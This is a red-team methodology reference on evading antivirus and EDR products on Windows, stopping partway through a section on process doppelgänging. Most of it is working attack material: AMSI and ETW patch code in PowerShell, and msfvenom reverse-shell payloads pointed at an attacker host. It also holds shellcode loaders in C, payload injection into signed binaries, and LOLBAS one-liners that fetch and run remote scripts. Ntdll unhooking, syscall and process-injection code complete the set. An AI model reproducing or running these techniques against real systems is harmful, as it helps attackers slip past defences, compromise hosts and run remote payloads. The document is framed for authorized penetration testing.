# AV / EDR Evasion Methodology

Reference for bypassing endpoint defenses during authorized engagements. Covers AMSI, encoders, in-memory loaders, LOLBAS, and ETW patching. Every tool-based technique is paired with a LOTL / in-memory equivalent that avoids dropping to disk.

Cross-references:
- [windows-methodology.md#410-amsi-etw-bypass-critical-for-powershell-tooling](windows-methodology.md#410-amsi-etw-bypass-critical-for-powershell-tooling) — execution context, UAC, AMSI bypass deep-dive
- [shells-and-payloads.md](shells-and-payloads.md) — payload formats and listeners
- [metasploit-framework.md](metasploit-framework.md) — msfvenom encoders / template injection
- [file-transfers.md](file-transfers.md) — staging payloads in memory
- [active-directory-methodology.md](active-directory-methodology.md) — AD-targeted payloads (Rubeus kerberoast/asreproast donut blobs, AD CS code-signing template)

> **Authorization scope:** The techniques here are for engagements with explicit written authorization. Do not use them outside the agreed RoE.

---

---

## Phase 0: AV/EDR Landscape

### Detection Layers

| Layer | What it sees | Bypass strategy |
|-------|--------------|-----------------|
| **Static signature** | Known byte patterns in files / memory | Polymorphic encoder, custom shellcode, encryption with runtime key |
| **Heuristic** | Suspicious imports, entropy, packers | Strip artifacts, low-entropy stub, sign binary |
| **AMSI** | Script content before execution (PowerShell, VBScript, JS, .NET, Office macros, WMI) | AMSI patch / `amsi.dll` unhook |
| **ETW (Event Tracing for Windows)** | Kernel telemetry stream consumed by EDR | Patch `EtwEventWrite` |
| **Kernel callbacks** | Process / thread / image creation via `PsSetCreate*Notify*` | Hard to bypass from user-mode; use unhooking, direct syscalls, or live-off-the-process |
| **Behavioral** | Sequence / parent-child anomalies | Match expected parent (explorer.exe, winword.exe), avoid noisy chains |
| **Memory scanning** | YARA-like in-process scans | Encrypt sleeping shellcode (sleep mask), allocate as `PAGE_NOACCESS`, ROP-protected stack |
| **Network IOCs** | Beacon URI, JA3, sleep cadence | Domain fronting / HTTPS, malleable C2 profiles, jitter |

### Common Endpoint Stacks (general posture, no detection-specific guidance)

| Vendor | Strength |
|--------|----------|
| Microsoft Defender | AMSI + cloud, weakest against custom unsigned loaders |
| CrowdStrike Falcon | Strong behavioral + cloud telemetry |
| SentinelOne | Strong static + behavioral |
| Carbon Black | Strong telemetry, weaker pure prevention |
| Sophos / ESET / Kaspersky | Strong static |
| ELASTIC EDR / Velociraptor | Telemetry-heavy, response-driven |

---

## Phase 1: AMSI Bypass

AMSI scans script content before execution. Bypass = make `AmsiScanBuffer` return clean for the lifetime of the current process.

> Detailed AMSI material lives in [windows-methodology.md#410-amsi-etw-bypass-critical-for-powershell-tooling](windows-methodology.md#410-amsi-etw-bypass-critical-for-powershell-tooling). The methods below are summary references.

### Reflection Patch — `amsiInitFailed` (PowerShell)

```powershell
# Classic — flips internal AMSI init flag in current PS process
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated variant (string concatenation evades signatures of the literal above)
$a=[Ref].Assembly.GetType(('Sys'+'tem.Manage'+'ment.Au'+'tomation.Am'+'siUti'+'ls'))
$a.GetField(('am'+'siIni'+'tFail'+'ed'),'NonPublic,Static').SetValue($null,$true)
```

### AmsiScanBuffer Patch (in-memory hook)

```powershell
# Allocate writable memory over AmsiScanBuffer prologue and write `mov eax,0x80070057; ret`
# 0x80070057 = E_INVALIDARG HRESULT — non-S_OK return causes the AMSI consumer to skip scanning.
# (Not the AMSI_RESULT enum; that's a different value space.) Multiple public PoCs (Tal Liberman, Adepts of 0xCC).
# Modern Defender flags string `AmsiScanBuffer` literal in PowerShell — load via reflection or strings split.

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $Win32
$h = [W]::LoadLibrary("amsi.dll")
$a = [W]::GetProcAddress($h, "AmsiScanBuffer")
$o = 0
$buf = [byte[]]@(0xB8,0x57,0x00,0x07,0x80,0xC3)        # mov eax,0x80070057 ; ret
[W]::VirtualProtect($a,[uint32]$buf.Length,0x40,[ref]$o) | Out-Null   # MUST be $buf.Length, not 5 — patch is 6 bytes
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$a,$buf.Length)
```

### Per-Engagement Tips

- Verify bypass with `amsiTrigger -i payload.ps1` after applying patch
- AMSI scope = process lifetime — re-launching `powershell.exe` resets it
- Constrained Language Mode + AppLocker often blocks reflection — test before relying
- Hardware-breakpoint AMSI bypass (HWBP via Dr0/DR7 + VEH) — see Phase 9b for the full implementation, ref: `RastaMouse/AmsiHwbp`
- .NET assemblies loaded via `Add-Type` / `Assembly.Load` are covered by the `AmsiScanBuffer` patch above — no separate hook needed for the .NET path

---

## Phase 2: msfvenom Encoders (limited utility)

```bash
# x86 polymorphic
msfvenom -p windows/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe

# x64
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -e x64/xor_dynamic -i 5 -f exe -o enc.exe

# Chained encoders
msfvenom -p windows/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -e x86/shikata_ga_nai -i 5 -f raw | \
  msfvenom -e x86/countdown -i 3 -f exe -o chained.exe
```

> **Reality check:** every msfvenom encoder stub is signatured by Defender 2018+. Use them only for bad-char filtering in BoF exploits; for AV bypass jump to donut/sgn/custom loaders.

---

## Phase 3: Template Injection

```bash
# Inject payload into legitimate signed binary, preserve original behavior
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -x /usr/share/windows-resources/binaries/putty.exe -k \
  -f exe -o putty_x.exe

# -x : template
# -k : keep original entry point — payload runs in new thread, app behaves normally
```

### Signed Binary Hijacking (DLL sideloading)

```text
1. Identify a signed app that loads a non-system DLL with relative path
2. Drop a malicious DLL with the same name next to the EXE
3. The signed binary loads our DLL with its trust context

Tools:
- siofra.exe / dnSpy : enumerate imports
- KoiLoader, DueDLLigence, robber : automate sideload candidate discovery
```

```bash
# Example: spawn meterpreter from a legit signed app via sideload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -f dll -o version.dll
# place next to a signed EXE that imports version.dll relatively
```

---

## Phase 4: Donut — Shellcode from PE/.NET/Script

Convert any PE/.NET assembly/JS/VBS into position-independent shellcode usable by any loader.

```bash
# Install (Kali — usually present)
which donut

# PE → shellcode
donut -i payload.exe -o donut.bin

# .NET assembly → shellcode (with optional class+method)
donut -i Rubeus.exe -p "kerberoast /outfile:hashes.txt" -o rubeus.bin

# Encrypted shellcode
donut -i payload.exe -k 2 -o donut.bin    # k=encryption mode

# Architecture
donut -a 2 -i payload.exe -o donut.bin    # 1=x86, 2=amd64, 3=both

# Bypass mode (AMSI/WLDP)
donut -b 3 -i payload.exe -o donut.bin    # 1=skip,2=abort,3=patch
```

### Loading Donut Shellcode

```c
// Minimal Win32 loader (compileable C)
#include <windows.h>
unsigned char shellcode[] = { /* contents of donut.bin */ };
int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode),
                              MEM_COMMIT|MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

```bash
# Cross-compile from Kali
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
i686-w64-mingw32-gcc loader.c -o loader32.exe -lws2_32
```

### Donut In-Memory via PowerShell (LOTL)

```powershell
# Fetch donut shellcode + execute reflectively (no disk)
$sc = (Invoke-WebRequest -Uri http://<ATTACKER_IP>/donut.bin -UseBasicParsing).Content
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $sc.Length)
# (Use VirtualProtect to mark RX, CreateThread; full PoCs in PowerSploit / SharpShellcodeRunner)
```

---

## Phase 5: Shikata Ga Nai (SGN) — Modern Encoder

Standalone Go reimplementation by EgeBalci with stronger anti-emulation than msfvenom's version.

```bash
# Install
go install github.com/EgeBalci/sgn@latest

# Encode raw shellcode
sgn -a 64 -i payload.bin -o encoded.bin
sgn -a 32 -i payload.bin -o encoded.bin

# Iterations
sgn -a 64 -c 50 -i payload.bin -o encoded.bin

# Bad chars
sgn -a 64 --badchars "00,0a,0d" -i payload.bin -o enc.bin

# Plain decoder stub (when EDR fingerprints common SGN stubs)
sgn -a 64 --plain-decoder -i payload.bin -o enc.bin
```

Pipeline: `msfvenom -f raw → donut/sgn → C loader → exe`. Encrypt at sleep with sleep mask (Ekko, FOLIAGE) for in-memory residency.

---

## Phase 6: Manual XOR/RC4 Stub (Minimal C PoC)

```c
// xor_loader.c — standalone XOR stub
#include <windows.h>
#include <stdio.h>

unsigned char enc[] = { /* xor-encoded bytes */ };
unsigned char key[] = "S3cr3tK3y!";
int main() {
    for (int i = 0; i < sizeof(enc); i++) enc[i] ^= key[i % (sizeof(key)-1)];
    void *m = VirtualAlloc(0, sizeof(enc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(m, enc, sizeof(enc));
    ((void(*)())m)();
    return 0;
}
```

```bash
# 1. Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f raw -o sc.bin

# 2. XOR-encode it (python helper)
python3 -c '
import sys
key=b"S3cr3tK3y!"
data=open("sc.bin","rb").read()
enc=bytes([b^key[i%len(key)] for i,b in enumerate(data)])
print(",".join(f"0x{b:02x}" for b in enc))' > shellcode.h

# 3. Paste into xor_loader.c, compile
x86_64-w64-mingw32-gcc xor_loader.c -o loader.exe -s -O2 -fno-ident -Wl,-s,--strip-all
```

### RC4 Variant

```c
void rc4(unsigned char *key, int klen, unsigned char *data, int dlen) {
    unsigned char S[256]; int i,j=0,t;
    for(i=0;i<256;i++) S[i]=i;
    for(i=0;i<256;i++){j=(j+S[i]+key[i%klen])&0xff; t=S[i];S[i]=S[j];S[j]=t;}
    for(i=0,j=0;i<dlen;i++){
        int x=(i+1)&0xff; j=(j+S[x])&0xff;
        t=S[x];S[x]=S[j];S[j]=t;
        data[i] ^= S[(S[x]+S[j])&0xff];
    }
}
```

---

## Phase 7: PE Loaders & Frameworks

### Process Hollowing

Spawn a legitimate process suspended → unmap its image → write malicious image → resume thread.

```text
CreateProcess(SUSPENDED) → NtUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread
```

Reference PoCs: `m0n0ph1/Process-Hollowing`, `RtlMixCl0wd`.

### Reflective DLL Injection

DLL contains a self-loading function (`ReflectiveLoader`) that resolves imports and relocates itself in another process. PoC: `stephenfewer/ReflectiveDLLInjection`. Used internally by Cobalt Strike's `dllinject`.

### Sliver C2 (`--evasion`)

```bash
# Build x64 EXE implant with evasion features (anti-debug, sleep mask)
sliver > generate --mtls <ATTACKER_IP>:8443 --os windows --arch amd64 --evasion --save /tmp/

# Donut-stager shellcode
sliver > generate stager --lhost <ATTACKER_IP> --lport 8443 --format raw --save /tmp/sliver.bin
```

### Other Frameworks

| Tool | Purpose |
|------|---------|
| **ScareCrow** | Loader generator: PE→loaded via syscalls + signed cert spoof |
| **Inceptor** | Pipeline: encrypt → encode → loader template → final EXE |
| **GreatSCT** | LOLBAS payload generator (msbuild, regasm, jsrat) |
| **Nim Loaders** | Nimcrypt2, NimGetSyscallStub — Nim language unfamiliar to AV signatures |
| **Freeze** | Suspend EDR DLL hooks before exec via PROCESS_CREATE_FLAGS |
| **Mortar / PEzor** | Encrypt PE w/ AES → decrypt+reflect at runtime |

---

## Phase 8: Living-Off-The-Land Binaries (LOLBAS)

Reference site: <https://lolbas-project.github.io>

### squiblydoo (regsvr32 + scrobj.dll)

```cmd
:: COM scriptlet
regsvr32 /s /n /u /i:http://<ATTACKER_IP>/file.sct scrobj.dll
```

### mshta

```cmd
:: HTML application
mshta http://<ATTACKER_IP>/payload.hta
mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -nop -w hidden -c IEX(IWR http://<ATTACKER_IP>/p.ps1 -UseBasicParsing)")(window.close)
```

### certutil

```cmd
:: Download (signed Microsoft binary)
certutil -urlcache -split -f http://<ATTACKER_IP>/p.exe C:\Windows\Temp\p.exe
:: Decode b64
certutil -decode b64.txt p.exe
```

### MSBuild inline tasks

```xml
<!-- payload.csproj — runs C# at build time -->
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="x"><ClassExample/></Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task><Code Type="Class" Language="cs"><![CDATA[
      using System; using System.Diagnostics;
      public class ClassExample : Microsoft.Build.Utilities.Task {
        public override bool Execute() {
          Process.Start("cmd.exe","/c calc.exe"); return true;
        }
      }
    ]]></Code></Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### installutil / regasm / regsvcs

```cmd
:: Run .NET assembly via InstallUtil (TrustedInstaller-trusted path)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

:: regasm / regsvcs — register COM, runs RegisterFunction()
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll
```

### rundll32 / pcalua / cmstp

```cmd
:: rundll32 + JS
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")

:: pcalua (Program Compatibility Assistant)
pcalua.exe -a c:\windows\system32\calc.exe

:: cmstp (INF auto-execute)
cmstp.exe /s payload.inf
```

### powershell `.NET` execution (no disk drop)

```powershell
# Reflective .NET assembly load — never touches disk
$bytes = (New-Object Net.WebClient).DownloadData('http://<ATTACKER_IP>/Rubeus.exe')
$asm = [Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, ,@('kerberoast','/outfile:h.txt'))

# Add-Type compile-and-run
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
}
"@

# IEX cradle (in-memory)
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')
```

---

## Phase 9: ETW Patching

Patch `EtwEventWrite` in `ntdll.dll` to return immediately, blinding most EDR telemetry consumers.

```powershell
# PowerShell ETW patch (current process only)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
Add-Type $Win32
$h = [W]::LoadLibrary("ntdll.dll")
$a = [W]::GetProcAddress($h, "EtwEventWrite")
$o = 0
[W]::VirtualProtect($a, [uint32]1, 0x40, [ref]$o) | Out-Null
$buf = [byte[]]@(0xC3)             # ret
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $a, 1)
```

> Patch BEFORE invoking AMSI bypass / running payload. Some EDRs hook the patch itself — combine with hardware-breakpoint or syscall-resolved primitives.

[↑ top](#table-of-contents)

---

## Phase 9b: Direct / Indirect Syscalls

Bypass user-mode hooks (EDR `ntdll` inline patches) by issuing the `syscall` instruction directly with the correct SSN (System Service Number).

### SysWhispers3 — generate syscall stubs

```bash
# Clone + generate
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3

# Common-set stubs (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtProtectVirtualMemory, NtOpenProcess)
python3 syswhispers.py -p common -o syscalls

# All NT* functions, indirect mode (jmp to syscall;ret inside ntdll, evades user-mode hooks even on the syscall instr itself)
python3 syswhispers.py -a x64 -f all -o syscalls --syscall-instruction syscall --method jumper_randomized

# Egg-hunter mode (SSN resolved at runtime via signature scan, defeats SSN-rotation)
python3 syswhispers.py -p common -o syscalls --method egg_hunter

# Compile generated stubs into loader
x86_64-w64-mingw32-gcc loader.c syscalls.c syscallsstubs.std.x64.s -o loader.exe -masm=intel
```

### HellsHall / HellsGate / HalosGate — in-line SSN resolution

```c
// HellsGate (Sektor7): walk EAT of ntdll, locate Nt* function, read syscall stub bytes
// to extract the SSN at offset 4 (mov eax, <SSN>).
// HalosGate variant: if syscall is hooked (jmp instead of mov eax),
// walk neighboring stubs +/- 32 bytes and compute SSN from delta.
// HellsHall: combines HalosGate (resolution) + indirect syscall (jmp into clean ntdll)

// Reference repos:
//   am0nsec/HellsGate
//   trickster0/TartarusGate    (HellsGate + neighbor-walk on hook)
//   crummie5/HellsHall          (full indirect syscall implementation)
```

### RecycledGate — borrow syscall instr from a non-hooked stub

```c
// RecycledGate (thefLink): for each Nt* in ntdll, scan for an unhooked syscall;ret
// gadget — even if your target Nt* is hooked, you can still issue the correct SSN
// by jumping into another function's syscall instr.
//
// Repo: thefLink/RecycledGate
// Build: nasm -f win64 RecycledGate.asm; x86_64-w64-mingw32-gcc loader.c RecycledGate.obj -o loader.exe
```

### Indirect syscall via clean-ntdll page

```c
// 1. Read fresh ntdll from disk (or \KnownDlls)
// 2. memcpy clean .text region into RX buffer
// 3. Resolve syscall;ret gadget address inside that buffer
// 4. Stub: mov r10,rcx; mov eax,SSN; jmp <gadget>   (NOT direct `syscall`)
//
// Defeats: nt!KiServiceTable user-mode shim hooks, ETW from user-mode `syscall`
// telemetry that fingerprints non-ntdll syscall sources.
```

### Hardware Breakpoint AMSI bypass (HWBP via Dr0–Dr7)

```c
// Set DR0 = address of AmsiScanBuffer; DR7 = enable bit + len/type
// On VEH hit: tweak return value (RAX) to AMSI_RESULT_CLEAN, advance RIP past prologue
#include <windows.h>

CONTEXT ctx = { 0 };
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(GetCurrentThread(), &ctx);
ctx.Dr0 = (DWORD64)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
ctx.Dr7 = 0x1;                           // L0=1 (enable Dr0, exec breakpoint, len 1)
SetThreadContext(GetCurrentThread(), &ctx);

// VEH: AddVectoredExceptionHandler(1, &handler);
// In handler: ExceptionInfo->ContextRecord->Rax = 0; (S_OK)
//             *(PDWORD)(ExceptionInfo->ContextRecord->R8) = AMSI_RESULT_CLEAN;
//             ExceptionInfo->ContextRecord->Rip = ret_address;
//             return EXCEPTION_CONTINUE_EXECUTION;
```

### Syscall stub generation in other languages

```bash
# Nim — NimlineWhispers3
nimble install winim
git clone https://github.com/ajpc500/NimlineWhispers3
nim c -d:release --opt:speed --app:console loader.nim

# Rust — rusty_syswhispers
cargo add ntapi windows
cargo build --release --target x86_64-pc-windows-gnu

# C# — D/Invoke (Dynamic Invoke, no P/Invoke imports → no IAT artifact)
# Repo: TheWover/DInvoke
# Resolve syscall via DInvoke.Manualmap + DInvoke.DynamicInvoke.Generic.GetSyscallStub
```

[↑ top](#table-of-contents)

---

## Phase 9c: ntdll Unhooking

Most EDRs hook `ntdll!Nt*` with a `jmp` to their inspection trampoline. Restore the original bytes from a clean copy before issuing sensitive calls.

### Fresh ntdll from disk

```c
// Read clean ntdll.dll from C:\Windows\System32 → memcpy over hooked .text in current process
#include <windows.h>

HMODULE hookedNtdll = GetModuleHandleA("ntdll.dll");
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                           GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);
LPVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ|FILE_MAP_EXECUTE, 0, 0, 0);

// Locate .text section in both copies, VirtualProtect → memcpy → restore protection
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hookedNtdll + ((PIMAGE_DOS_HEADER)hookedNtdll)->e_lfanew);
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (!strcmp((char*)sec[i].Name, ".text")) {
        DWORD oldProt;
        VirtualProtect((BYTE*)hookedNtdll + sec[i].VirtualAddress,
                       sec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
        memcpy((BYTE*)hookedNtdll + sec[i].VirtualAddress,
               (BYTE*)cleanNtdll  + sec[i].VirtualAddress,
               sec[i].Misc.VirtualSize);
        VirtualProtect((BYTE*)hookedNtdll + sec[i].VirtualAddress,
                       sec[i].Misc.VirtualSize, oldProt, &oldProt);
    }
}
UnmapViewOfFile(cleanNtdll); CloseHandle(hMap); CloseHandle(hFile);
```

### Perun's Fart — suspended-process technique

```c
// Spawn a sacrificial process SUSPENDED (e.g. notepad.exe with CREATE_SUSPENDED).
// EDR hasn't injected/hooked ntdll in the suspended process yet — its ntdll image is clean.
// ReadProcessMemory the .text from the suspended ntdll → write into our own.
//
// Repo: plackyhacker/Perun-s-Fart
STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED|CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
// ReadProcessMemory(pi.hProcess, remoteNtdllText, localBuf, size, NULL);
// memcpy over hooked region in own process; TerminateProcess(pi.hProcess, 0);
```

### RefleXXion — direct-syscall NtCreateSection on \KnownDlls\ntdll.dll

```c
// Repo: hlldz/RefleXXion
// 1. NtOpenSection on \KnownDlls\ntdll.dll  (guaranteed unhooked, kernel-mapped)
// 2. NtMapViewOfSection into current process at non-default base
// 3. Walk EAT, parse PE, identify .text → memcpy over hooked ntdll .text
// 4. Apply relocations if base differs
// All four NT* calls issued via direct syscall stubs to avoid the very hooks
// you're trying to remove.
```

### KnownDlls section abuse

```c
// \KnownDlls is a kernel-managed cache of common DLLs (ntdll, kernel32, user32...)
// always loaded clean. Open via NtOpenSection.
UNICODE_STRING us;
RtlInitUnicodeString(&us, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &us, OBJ_CASE_INSENSITIVE };
HANDLE hSec;
NtOpenSection(&hSec, SECTION_MAP_READ|SECTION_MAP_EXECUTE, &oa);
PVOID base = NULL; SIZE_T sz = 0;
NtMapViewOfSection(hSec, GetCurrentProcess(), &base, 0, 0, NULL,
                   &sz, ViewUnmap, 0, PAGE_EXECUTE_READ);
// `base` now points at clean ntdll image — locate .text via PE parsing, copy over hooked region
```

[↑ top](#table-of-contents)

---

## Phase 9d: Sleep Masking / Call-Stack Spoofing

EDR memory scans during beacon sleep find unencrypted shellcode + suspicious RIPs on the stack. Encrypt-while-sleeping + spoof the call stack.

### Ekko — timer-queue ROP-driven xor encryption

```c
// Repo: Cracked5pider/Ekko
// Idea: register CreateTimerQueueTimer with a ROP chain that:
//   1. VirtualProtect(beacon, RW)
//   2. SystemFunction032 (RC4 encrypt with ephemeral key)
//   3. WaitForSingleObject(sleep_dur)
//   4. SystemFunction032 (RC4 decrypt)
//   5. VirtualProtect(beacon, RX)
//   6. NtContinue back into beacon
```

```bash
# Build
git clone https://github.com/Cracked5pider/Ekko
cd Ekko && make
# Embeds Ekko_Sleep(milliseconds) as drop-in replacement for Sleep() in beacon main loop
```

### FOLIAGE — thread-context based sleep mask

```c
// Repo: SecIdiot/FOLIAGE
// Variant of Ekko but uses NtSetContextThread instead of timer queue → suspends own thread,
// queues APC chain via NtQueueApcThreadEx with the encrypt/wait/decrypt gadgets.
// Smaller IOC footprint than Ekko's CreateTimerQueueTimer (which leaves timer-queue artifacts).
```

### ThreadStackSpoof — hide evil RIPs during sleep

```c
// Repo: WKL-Sec/SilentMoonwalk  (modern stack-spoof, return-address synthesis)
//        Cobalt Strike Mutator BOF / namazso/SilentMoonwalk
//
// During sleep, walk own thread stack, replace each frame's saved RIP with a benign
// RIP from a signed module (kernel32!BaseThreadInitThunk, ntdll!RtlUserThreadStart).
// Restore real RIPs after sleep before resume.
//
// Detection avoidance: on EDR snapshot, stack looks like an idle worker thread,
// not a malicious in-memory beacon.
```

### Cobalt Strike — UDRL / sleep_mask kit

```bash
# Sleep mask kit (CS 4.7+): replace default xor-mask sleep with custom (Ekko-style)
cd ~/cobaltstrike/arsenal_kit/kits/sleep_mask
make MODE=ekko       # or MODE=foliage / MODE=zilean
# Output: sleep_mask.x64.o → load via Malleable C2 profile:
#   stage { sleep_mask "true"; }
#   sleep_mask { ekko_jitter "10"; }

# UDRL (User-Defined Reflective Loader) — replace default reflective loader
cd ~/cobaltstrike/arsenal_kit/kits/udrl-vs
make
# Profile:  stage { transform-x64 { prepend "\x90\x90"; } module_x64 "kernel32.dll"; }
#           stage { userwx "false"; cleanup "true"; }
```

### Sliver beacon obfuscation

```bash
# Generate beacon with obfuscation + sleep encryption
sliver > generate beacon --mtls <ATTACKER_IP>:8443 --os windows --arch amd64 \
    --evasion --obfuscate --seconds 60 --jitter 30 --save /tmp/

# --evasion : adds sleep-mask, anti-debug, syscall-based loader
# --obfuscate : Garble obfuscation (string + symbol mangling) on Go binary
```

[↑ top](#table-of-contents)

---

## Phase 9e: Modern Injection Variants

Beyond classic CreateRemoteThread / Process Hollowing.

### Early Bird APC injection

```c
// Queue APC to suspended remote thread BEFORE the EDR DLL injects into target → APC fires
// during initial thread resume, before EDR hooks are placed.
#include <windows.h>

STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED|CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

LPVOID rmt = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
                            MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, rmt, shellcode, sizeof(shellcode), NULL);
QueueUserAPC((PAPCFUNC)rmt, pi.hThread, 0);   // fires when thread is alertable on resume
ResumeThread(pi.hThread);

// Direct-syscall variant: NtCreateUserProcess + NtAllocateVirtualMemory + NtWriteVirtualMemory + NtQueueApcThread + NtResumeThread
```

### Ghostly Hollowing (TxF-free hollow)

```c
// Classic hollowing: WriteProcessMemory with PAGE_EXECUTE_READWRITE → flagged.
// Ghostly: NtCreateSection (file-backed section) → NtMapViewOfSection into target with
// PAGE_READONLY → write to section's local view (not target memory) → target sees executable
// section without ever calling WriteProcessMemory.
//
// Repo: hasherezade/process_ghosting (TxF variant) and forks for non-TxF "ghostly" variants
HANDLE hSec;
LARGE_INTEGER size = { .QuadPart = sizeof(payload) };
NtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, &size,
                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
PVOID localView = NULL; SIZE_T viewSize = 0;
NtMapViewOfSection(hSec, GetCurrentProcess(), &localView, 0, 0, NULL,
                   &viewSize, ViewUnmap, 0, PAGE_READWRITE);
memcpy(localView, payload, sizeof(payload));      // writes to OUR view; section is shared
PVOID remoteView = NULL; viewSize = 0;
NtMapViewOfSection(hSec, hRemoteProcess, &remoteView, 0, 0, NULL,
                   &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
// Set remote thread RIP/Rcx to remoteView via NtSetContextThread → resume
```

### Module Stomping

```c
// Load a benign signed DLL into target → overwrite its .text with shellcode →
// memory page reports as backed by signed module path (false attribution).
HMODULE h = LoadLibraryA("amsi.dll");                 // benign signed module
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + ((PIMAGE_DOS_HEADER)h)->e_lfanew);
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
LPVOID textBase = (BYTE*)h + sec[0].VirtualAddress;   // .text section
DWORD oldProt;
VirtualProtect(textBase, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(textBase, shellcode, sizeof(shellcode));
VirtualProtect(textBase, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProt);
((void(*)())textBase)();
// Memory scan reports: PAGE_EXECUTE_READ in C:\Windows\System32\amsi.dll — looks legit
```

### Mockingjay — RW+X regions in legitimate signed modules

```c
// Some signed DLLs ship with sections that are already RWX (e.g. msys-2.0.dll has a default
// RWX section). Locate one, drop shellcode → no VirtualProtect, no allocation, no IOC.
//
// Reference: SafeBreach 2023 disclosure ("Mockingjay")
// Hunt for RWX sections:
//   for f in /c/Windows/System32/*.dll; do dumpbin /headers "$f" | grep -B2 "Execute Read Write"; done
//   (or use pe-bear / CFF Explorer GUI)
//
// Once located: LoadLibrary the carrier DLL, locate the RWX section by VA, memcpy shellcode → jump.
HMODULE h = LoadLibraryA("msys-2.0.dll");
LPVOID rwxRegion = (BYTE*)h + KNOWN_RWX_OFFSET;       // determined per-module
memcpy(rwxRegion, shellcode, sizeof(shellcode));
((void(*)())rwxRegion)();
```

### Process Doppelgänging (TxF, legacy)

```c
// Uses NTFS Transactional File System (TxF) — committed-but-rolled-back file image runs in memory.
// TxF deprecated by Microsoft (2018+), but still works on legacy hosts (Win7/Server 2012/2016).
//
// Repo: hasherezade/process_doppelganging
// Flow:
//   1. CreateTransaction
//   2. CreateFileTransacted (writable handle inside transaction)
//   3. WriteFile(payload PE bytes)
